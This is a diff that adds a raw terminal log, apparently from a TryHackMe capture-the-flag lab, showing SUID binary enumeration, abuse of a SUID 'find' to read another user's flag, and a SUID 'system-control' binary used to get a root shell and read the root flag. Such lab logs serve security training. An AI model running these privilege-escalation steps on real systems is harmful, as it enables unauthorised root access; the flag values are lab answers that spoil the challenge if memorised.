@@ -1,0 +1,78 @@
+
+holly@ip-10-10-197-138:~$ ls -la
+total 28
+drwxr-xr-x 3 holly holly 4096 Dec  7  2019 .
+drwxr-xr-x 5 root  root  4096 Dec  7  2019 ..
+-rw------- 1 holly holly  279 Dec  7  2019 .bash_history
+-rw-r--r-- 1 holly holly  220 Dec  7  2019 .bash_logout
+-rw-r--r-- 1 holly holly 3771 Dec  7  2019 .bashrc
+drwx------ 2 holly holly 4096 Dec  7  2019 .cache
+-rw-r--r-- 1 holly holly  655 Dec  7  2019 .profile
+holly@ip-10-10-197-138:~$ 
+
+
+~$ find / -user igor -perm -4000 -exec ls -ldb {} \; 2>/dev/null
+-rwsr-xr-x 1 igor igor 221768 Feb  7  2016 /usr/bin/find
+-rwsr-xr-x 1 igor igor 2770528 Mar 31  2016 /usr/bin/nmap
+holly@ip-10-10-197-138:~$ find /home/igor/flag1.txt -exec cat '{}' \;
+THM{d3f0708bdd9accda7f937d013eaf2cd8}
+holly@ip-10-10-197-138:~$ 
+holly@ip-10-10-197-138:~$ find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
+-rwsr-xr-x 1 root root 44168 May  7  2014 /bin/ping
+-rwsr-xr-x 1 root root 27608 Aug 23  2019 /bin/umount
+-rwsr-xr-x 1 root root 44680 May  7  2014 /bin/ping6
+-rwsr-xr-x 1 root root 40128 Mar 26  2019 /bin/su
+-rwsr-xr-x 1 root root 30800 Jul 12  2016 /bin/fusermount
+-rwsr-xr-x 1 root root 40152 Aug 23  2019 /bin/mount
+-rwsr-xr-x 1 root root 40152 May 15  2019 /snap/core/7396/bin/mount
+-rwsr-xr-x 1 root root 44168 May  7  2014 /snap/core/7396/bin/ping
+-rwsr-xr-x 1 root root 44680 May  7  2014 /snap/core/7396/bin/ping6
+-rwsr-xr-x 1 root root 40128 Mar 25  2019 /snap/core/7396/bin/su
+-rwsr-xr-x 1 root root 27608 May 15  2019 /snap/core/7396/bin/umount
+-rwsr-xr-x 1 root root 71824 Mar 25  2019 /snap/core/7396/usr/bin/chfn
+-rwsr-xr-x 1 root root 40432 Mar 25  2019 /snap/core/7396/usr/bin/chsh
+-rwsr-xr-x 1 root root 75304 Mar 25  2019 /snap/core/7396/usr/bin/gpasswd
+-rwsr-xr-x 1 root root 39904 Mar 25  2019 /snap/core/7396/usr/bin/newgrp
+-rwsr-xr-x 1 root root 54256 Mar 25  2019 /snap/core/7396/usr/bin/passwd
+-rwsr-xr-x 1 root root 136808 Jun 10  2019 /snap/core/7396/usr/bin/sudo
+-rwsr-xr-- 1 root systemd-network 42992 Jun 10  2019 /snap/core/7396/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root root 428240 Mar  4  2019 /snap/core/7396/usr/lib/openssh/ssh-keysign
+-rwsr-sr-x 1 root root 106696 Jul 12  2019 /snap/core/7396/usr/lib/snapd/snap-confine
+-rwsr-xr-- 1 root dip 394984 Jun 12  2018 /snap/core/7396/usr/sbin/pppd
+-rwsrwxr-x 1 root root 8880 Dec  7  2019 /usr/bin/system-control
+-rwsr-xr-x 1 root root 32944 Mar 26  2019 /usr/bin/newuidmap
+-rwsr-xr-x 1 root root 54256 Mar 26  2019 /usr/bin/passwd
+-rwsr-xr-x 1 root root 39904 Mar 26  2019 /usr/bin/newgrp
+-rwsr-xr-x 1 root root 136808 Jun 10  2019 /usr/bin/sudo
+-rwsr-xr-x 1 root root 40432 Mar 26  2019 /usr/bin/chsh
+-rwsr-xr-x 1 root root 71824 Mar 26  2019 /usr/bin/chfn
+-rwsr-xr-x 1 root root 23376 Mar 27  2019 /usr/bin/pkexec
+-rwsr-xr-x 1 root root 75304 Mar 26  2019 /usr/bin/gpasswd
+-rwsr-xr-x 1 root root 32944 Mar 26  2019 /usr/bin/newgidmap
+-rwsr-xr-x 1 root root 14864 Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
+-rwsr-xr-x 1 root root 84120 Apr  9  2019 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+-rwsr-xr-- 1 root messagebus 42992 Jun 10  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root root 428240 Mar  4  2019 /usr/lib/openssh/ssh-keysign
+-rwsr-sr-x 1 root root 106696 Aug 20  2019 /usr/lib/snapd/snap-confine
+-rwsr-xr-x 1 root root 10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
+holly@ip-10-10-197-138:~$  system-control
+
+===== System Control Binary =====
+
+Enter system command: su
+root@ip-10-10-197-138:/home/holly# ls
+root@ip-10-10-197-138:/home/holly# ls -la
+total 28
+drwxr-xr-x 3 holly holly 4096 Dec  7  2019 .
+drwxr-xr-x 5 root  root  4096 Dec  7  2019 ..
+-rw------- 1 holly holly  279 Dec  7  2019 .bash_history
+-rw-r--r-- 1 holly holly  220 Dec  7  2019 .bash_logout
+-rw-r--r-- 1 holly holly 3771 Dec  7  2019 .bashrc
+drwx------ 2 holly holly 4096 Dec  7  2019 .cache
+-rw-r--r-- 1 holly holly  655 Dec  7  2019 .profile
+root@ip-10-10-197-138:/home/holly# cat /root/flag2.txt 
+THM{8c8211826239d849fa8d6df03749c3a2}
+
+
+
+
